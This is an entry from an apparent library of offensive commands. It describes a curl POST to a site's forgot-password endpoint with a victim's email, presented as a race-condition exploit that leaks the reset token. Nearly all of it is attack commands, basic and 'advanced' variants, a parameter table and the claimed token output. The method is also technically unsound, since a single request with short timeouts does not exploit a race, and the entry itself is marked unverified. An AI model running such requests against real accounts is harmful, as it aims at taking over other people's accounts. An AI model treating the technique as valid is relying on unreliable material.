---
id: cmd-2142109
data: >-
  curl -X POST 'https://target.com/api/forgot-password' -H 'Content-Type:
  application/json' -d '{"email":"victim@example.com"}' --max-time 5
  --connect-timeout 1 -w "%{http_code}\n"
tags:
  - web
  - timing-attack
  - auth
type: command
output: |-
  HTTP/1.1 200 OK
  {"token": "abc123def456"} (if race condition exploited)
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:24.458Z'
verified: false
validated: true
submitted: true
---
# curl-timed-forgot-password-request

## Command

```bash
curl -X POST 'https://target.com/api/forgot-password' \
  -H 'Content-Type: application/json' \
  -d '{"email":"victim@example.com"}' \
  --max-time 5 --connect-timeout 1 -w "%{http_code}\n"
```

## Description

This command sends a timed HTTP POST request to a forgot-password endpoint to exploit a race condition, potentially retrieving the password reset token. It uses curl's timeout options for rapid execution, critical for timing attacks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `'https://target.com/api/forgot-password'` | Target endpoint URL | Yes |
| `-H 'Content-Type: application/json'` | Sets JSON content type header | Yes |
| `-d '{"email":"victim@example.com"}'` | JSON payload with victim email | Yes |
| `--max-time 5` | Maximum time for entire operation (seconds) | Yes |
| `--connect-timeout 1` | Connection timeout (seconds) for speed | Yes |
| `-w "%{http_code}\n"` | Prints HTTP status code | No |

## Examples

### Basic Usage

```bash
curl -X POST 'https://target.com/api/forgot-password' -H 'Content-Type: application/json' -d '{"email":"victim@example.com"}'
```

### Advanced Usage

```bash
curl -X POST 'https://target.com/api/forgot-password' -H 'Content-Type: application/json' -d '{"email":"victim@example.com"}' --max-time 1 --connect-timeout 0.5 -s -o response.json
```

## Expected Output

Successful exploitation returns the token in JSON: {"token": "abc123def456"} with HTTP 200. Non-exploited requests return {"message": "Email sent"} without token.

## Related

- [[Related Procedure|procedures/Exploit-Race-Condition-in-Forgot-Password-for-Token-Retrieval]]
